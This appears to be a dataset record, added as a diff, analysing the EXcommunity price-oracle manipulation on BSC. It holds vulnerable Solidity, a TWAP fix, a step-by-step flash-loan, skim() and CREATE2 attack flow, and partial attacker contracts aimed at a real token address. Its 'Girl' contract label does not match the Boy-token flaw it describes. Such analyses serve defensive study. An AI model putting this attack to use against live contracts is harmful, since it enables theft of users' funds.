@@ -1,0 +1,39 @@
+{
+ "id": "2024__2024-05-XX_EXcommunity_GetPriceCREATE2Manipulation",
+ "source_file": "2024/2024-05-XX_EXcommunity_GetPriceCREATE2Manipulation.md",
+ "title": "EXcommunity — getPrice() + CREATE2 Price Oracle Manipulation Analysis",
+ "date": "2024-05-01",
+ "protocol": "EXcommunity",
+ "chain": "BSC",
+ "loss_raw": "~33 BNB",
+ "loss_usd": null,
+ "root_cause": "The Boy token's `getPrice()` function uses DEX pair spot reserves, allowing an attacker to manipulate reserves via `skim()` and then call `buy()` through 10 helper contracts deployed with CREATE2 to mint an excessive amount of Boy tokens at a distorted price",
+ "attack_tx": null,
+ "vulnerable_contract": "Girl 0xb1de93DA",
+ "classes": [
+  "create2-exploit"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: getPrice uses spot reserves\ncontract BoyToken {\n    IUniswapV2Pair public pair;\n\n    function getPrice() public view returns (uint256) {\n        (uint112 r0, uint112 r1,) = pair.getReserves();\n        // ← r0, r1 can be manipulated via skim()\n        return uint256(r1) * 1e18 / uint256(r0);\n    }\n\n    function buy() external payable {\n        uint256 price = getPrice();  // manipulated spot price\n        uint256 mintAmount = msg.value * 1e18 / price;\n        _mint(msg.sender, mintAmount);  // over-minting\n    }\n}\n\n//",
+  "// File: EXcommunity_decompiled.sol\ncontract EXcommunity {\n    function getPrice() external view returns (uint256) {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: TWAP-based price\nfunction getPrice() public view returns (uint256) {\n    // 30-minute TWAP\n    (uint256 price0Cumulative, uint256 price1Cumulative, uint32 blockTimestamp) =\n        UniswapV2OracleLibrary.currentCumulativePrices(address(pair));\n    // TWAP calculation...\n    return twapPrice;\n}"
+ ],
+ "steps": [
+  "→ [1] V3 Flash Loan: 400,000 BUSDT",
+  "→ [2] BUSDT → Girl Token swap",
+  "→ [3] Transfer Girl tokens to Boy/Girl pair",
+  "→ [4] pair.skim() → Boy pair reserves distorted",
+  "→ [5] Deploy 10 Money helper contracts via CREATE2",
+  "→ [6] Each helper calls buy{value: 3 BNB}()",
+  "Manipulated low price → Boy tokens over-minted",
+  "→ [7] Boy tokens → WBNB reverse swap",
+  "→ [8] Repay V3 flash loan",
+  "→ [9] ~33 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] V3 Flash Loan: 400,000 BUSDT\n  │\n  ├─→ [2] BUSDT → Girl Token swap\n  │\n  ├─→ [3] Transfer Girl tokens to Boy/Girl pair\n  │\n  ├─→ [4] pair.skim() → Boy pair reserves distorted\n  │         └─ getPrice() return value distorted\n  │\n  ├─→ [5] Deploy 10 Money helper contracts via CREATE2\n  │\n  ├─→ [6] Each helper calls buy{value: 3 BNB}()\n  │         └─ Manipulated low price → Boy tokens over-minted\n  │\n  ├─→ [7] Boy tokens → WBNB reverse swap\n  │\n  ├─→ [8] Repay V3 flash loan\n  │\n  └─→ [9] ~33 BNB profit",
+  "interface IBoyToken {\n    function buy() external payable;\n    function getPrice() external view returns (uint256);\n}\n\ninterface IPancakePair {\n    function skim(address to) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract Money {\n    IBoyToken constant boy = IBoyToken(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f);\n\n    // Helper contract deployed via CREATE2\n    function buy() external payable {\n        boy.buy{value: msg.value}();\n        // Transfer minted Boy tokens back to attacker\n        IERC20(address(boy)).transfer(msg.sender, IERC20(address(boy)).balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}\n\ncontract AttackContract {\n    IBoyToken    constant boy  = IBoyToken(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f);\n    "
+ ]
+}
